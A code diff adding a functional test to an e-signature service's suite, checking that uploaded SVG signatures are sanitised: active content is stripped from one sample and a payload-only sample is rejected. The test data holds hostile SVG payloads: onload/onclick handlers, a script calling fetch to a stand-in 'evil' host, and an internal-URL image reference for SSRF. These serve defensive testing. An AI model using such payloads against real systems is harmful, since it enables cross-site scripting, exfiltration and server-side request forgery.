@@ -541,4 +541,62 @@ describe('Phase 5 · Signatures · FUNCTIONAL — QA-manager sign-off', () => {
       expect(absent.status).toBe(404);
     },
   );
+
+  // ─── F8: signature-flow H2 — INGEST sanitisation strips active content ──
+  // A malicious SVG that ALSO carries a legit <path> is accepted (the stroke
+  // is a real signature) but the active content (script/onload) is stripped
+  // BEFORE encrypt+store; the signed certificate still renders (proving the
+  // stored blob is the clean rebuilt SVG). A PURE-PAYLOAD SVG (no drawable
+  // path) is REJECTED 400 — nothing malicious is ever persisted.
+  ft(
+    'F8 (H2) ingest sanitisation: malicious-with-path signs (stripped+stored), pure-payload → 400',
+    async () => {
+      const at = await signup('f8');
+
+      // (a) Malicious SVG WITH a real stroke → 200 (signature preserved,
+      //     active content stripped at ingest), and the signed certificate
+      //     PDF renders from the sanitised stored blob.
+      {
+        const { documentId: doc, ownerId: owner } = await createAssociatedDocAndOwner(at);
+        const { token, requestId } = await createSignatureRequest(at, doc, owner);
+        const evil =
+          '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 50" onload="steal()">' +
+          '<script>fetch("//evil")</script>' +
+          '<image href="http://internal/ssrf"/>' +
+          '<path d="M 10 10 L 50 25 L 90 10" onclick="x()" stroke="black" fill="none"/>' +
+          '</svg>';
+        const sign = await call(`/sign/${token}`, {
+          method: 'POST',
+          body: JSON.stringify({ signatureSvg: evil }),
+        });
+        expect(sign.status, `malicious-with-path sign should succeed: ${sign.raw}`).toBe(200);
+
+        // The signed certificate PDF renders from the STORED (sanitised) blob —
+        // proves the stripped-but-present geometry round-tripped through store.
+        const dl = await fetch(`${API}/signature-requests/${requestId}/signed-document`, {
+          headers: { 'x-throttle-bypass': BYPASS, cookie: `access_token=${at}` },
+        });
+        expect(dl.status).toBe(200);
+        const bytes = Buffer.from(await dl.arrayBuffer());
+        expect(bytes.subarray(0, 5).toString('latin1')).toBe('%PDF-');
+      }
+
+      // (b) PURE-PAYLOAD SVG (no drawable <path>) → rejected. Passes the wire
+      //     regex (`<svg…</svg>`) + byte cap but the sanitiser yields nothing
+      //     drawable, so sign() rejects with a client 400 — and the row stays
+      //     pending (the whole tx rolled back; no signature/consent persisted).
+      {
+        const { documentId: doc, ownerId: owner } = await createAssociatedDocAndOwner(at);
+        const { token } = await createSignatureRequest(at, doc, owner);
+        const payloadOnly =
+          '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 50">' +
+          '<script>fetch("//evil")</script><g><rect width="10" height="10"/></g></svg>';
+        const rej = await call(`/sign/${token}`, {
+          method: 'POST',
+          body: JSON.stringify({ signatureSvg: payloadOnly }),
+        });
+        expect(rej.status, `pure-payload sign should be rejected: ${rej.raw}`).toBe(400);
+      }
+    },
+  );
 });
